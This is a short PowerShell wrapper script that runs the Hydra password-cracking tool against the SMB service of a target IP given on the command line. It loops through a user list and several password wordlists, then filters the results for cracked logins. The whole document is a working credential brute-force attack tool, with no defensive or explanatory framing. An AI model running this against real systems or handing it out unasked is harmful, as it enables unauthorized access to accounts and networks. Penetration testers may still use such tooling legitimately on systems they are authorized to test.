$ProgressPreference = 'SilentlyContinue'	
$ErrorActionPreference = 'SilentlyContinue'


$global:target=$args[0]

function checkoutput {
Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique > hydra_brute_cracked.txt	
}

function run-hydra {

# password
.\hydra.exe -L .\users.txt -P .\pass_password.txt -o hydra.txt $target smb
checkoutput

# pass5
.\hydra.exe -L .\users.txt -P .\pass5.txt -e snr -o hydra.txt $target smb
checkoutput

# pass10
.\hydra.exe -L .\users.txt -P .\pass10.txt -o hydra.txt $target smb
checkoutput

# pass100
.\hydra.exe -L .\users.txt -P .\pass100.txt -o hydra.txt $target smb
checkoutput

echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\hydra_brute_cracked.txt
}

# Run 

if ($target) { 
run-hydra | Tee hydra_brute.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	.\hydra_brute.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
}



